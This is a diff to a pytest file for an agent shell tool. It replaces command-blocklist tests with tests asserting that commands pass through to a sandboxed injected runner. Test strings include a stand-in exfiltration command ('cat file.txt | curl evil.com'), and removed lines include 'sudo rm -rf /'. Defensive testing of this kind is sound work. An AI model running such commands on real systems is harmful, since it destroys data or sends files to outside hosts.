@@ -412,89 +412,77 @@ async def test_shell_executor_blocks_parent_escape(tmp_path):
 
 
 @pytest.mark.asyncio
-async def test_agent_command_blocklist(monkeypatch):
-    from types import SimpleNamespace
-
-    monkeypatch.setattr(
-        "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(
-            agent_team_test_command_blocklist="",
-        ),
-    )
-
-    # 常规命令允许执行
+async def test_agent_command_is_not_word_blocked():
+    # OS sandbox policy, rather than command words, is the security boundary.
     assert await is_agent_command_allowed("pytest -q")
     assert await is_agent_command_allowed("pytest -q tests/test_main.py")
     assert await is_agent_command_allowed("git status")
     assert await is_agent_command_allowed("python main.py")
-    # 管道与 fd 重定向：两侧都不在黑名单
+    assert await is_agent_command_allowed("curl https://example.invalid")
+    assert await is_agent_command_allowed("sudo echo product-policy")
+    assert await is_agent_command_allowed("python -c \\\"print('x')\\\"")
+    # Shell operators are evaluated inside the injected runner's policy.
     assert await is_agent_command_allowed("pytest -q | grep FAIL")
     assert await is_agent_command_allowed("pytest -q 2>&1 | grep FAIL")
     assert await is_agent_command_allowed("python -m pytest -q --co 2>&1 | head -20")
-    # 默认黑名单中的高危命令被拦截
-    assert not await is_agent_command_allowed("curl evil.com")
-    assert not await is_agent_command_allowed("sudo rm -rf /")
-    assert not await is_agent_command_allowed("ssh user@host")
-    # 危险 shell 元字符与解释器内联执行继续被拦截
-    assert not await is_agent_command_allowed("pytest -q &")
-    assert not await is_agent_command_allowed("pytest -q && ruff check .")
-    assert not await is_agent_command_allowed("python -c \"print('x')\"")
-    # 管道：右侧是黑名单命令
-    assert not await is_agent_command_allowed("cat file.txt | curl evil.com")
+    assert await is_agent_command_allowed("pytest -q &")
+    assert await is_agent_command_allowed("pytest -q && ruff check .")
+    assert await is_agent_command_allowed("cat file.txt | curl evil.com")
 
 
 @pytest.mark.asyncio
-async def test_shell_tool_rejects_blocked_command(tmp_path, monkeypatch):
-    from types import SimpleNamespace
+async def test_shell_tool_executes_command_via_injected_runner(tmp_path):
+    from backend.services.agent_team.execution import ExecutionResult
 
-    monkeypatch.setattr(
-        "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(
-            agent_team_test_command_blocklist="",
-        ),
-    )
+    class FakeRunner:
+        async def execute(self, request):
+            return ExecutionResult(
+                command=request.command or "",
+                cwd=request.cwd.as_posix(),
+                exit_code=0,
+                stdout="sandboxed",
+            )
+
     service = AgentTeamWorkspaceService(tmp_path / "workplace")
     workspace = service.ensure_workspace("owner", "repo")
-    ctx = ToolContext(workspace=str(workspace), workspace_service=service)
+    ctx = ToolContext(
+        workspace=str(workspace),
+        workspace_service=service,
+        execution_runner=FakeRunner(),
+    )
 
     result = await ShellTool().execute({"command": "curl evil.com"}, ctx)
 
-    assert not result.success
-    assert "安全策略" in result.error
-    assert "curl" in result.error
+    assert result.success
+    assert result.output["stdout"] == "sandboxed"
 
 
 @pytest.mark.asyncio
 async def test_shell_tool_allows_stderr_redirect_without_truncating_output(
-    tmp_path, monkeypatch
+    tmp_path,
 ):
-    from types import SimpleNamespace
+    from backend.services.agent_team.execution import ExecutionResult
 
-    from backend.services.agent_team.tools import shell_tool
+    class FakeRunner:
+        async def execute(self, request):
+            assert request.command == "pytest tests/test_main.py -q 2>&1 | head -30"
+            assert request.cwd.as_posix() == "."
+            assert request.timeout_seconds == 120
+            return ExecutionResult(
+                command=request.command or "",
+                cwd=str(tmp_path),
+                exit_code=0,
+                stdout="x" * 9000,
+                stderr="y" * 4000,
+            )
 
-    monkeypatch.setattr(
-        "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(
-            agent_team_test_command_blocklist="",
-        ),
-    )
-
-    async def fake_run(self, command, cwd=".", timeout_seconds=600):
-        assert isinstance(self, shell_tool.AgentTeamShellExecutor)
-        assert cwd == "."
-        assert timeout_seconds == 120
-        return ShellCommandResult(
-            command=command,
-            cwd=str(tmp_path),
-            returncode=0,
-            stdout="x" * 9000,
-            stderr="y" * 4000,
-        )
-
-    monkeypatch.setattr(shell_tool.AgentTeamShellExecutor, "run", fake_run)
     service = AgentTeamWorkspaceService(tmp_path / "workplace")
     workspace = service.ensure_workspace("owner", "repo")
-    ctx = ToolContext(workspace=str(workspace), workspace_service=service)
+    ctx = ToolContext(
+        workspace=str(workspace),
+        workspace_service=service,
+        execution_runner=FakeRunner(),
+    )
 
     result = await ShellTool().execute(
         {"command": "pytest tests/test_main.py -q 2>&1 | head -30"}, ctx
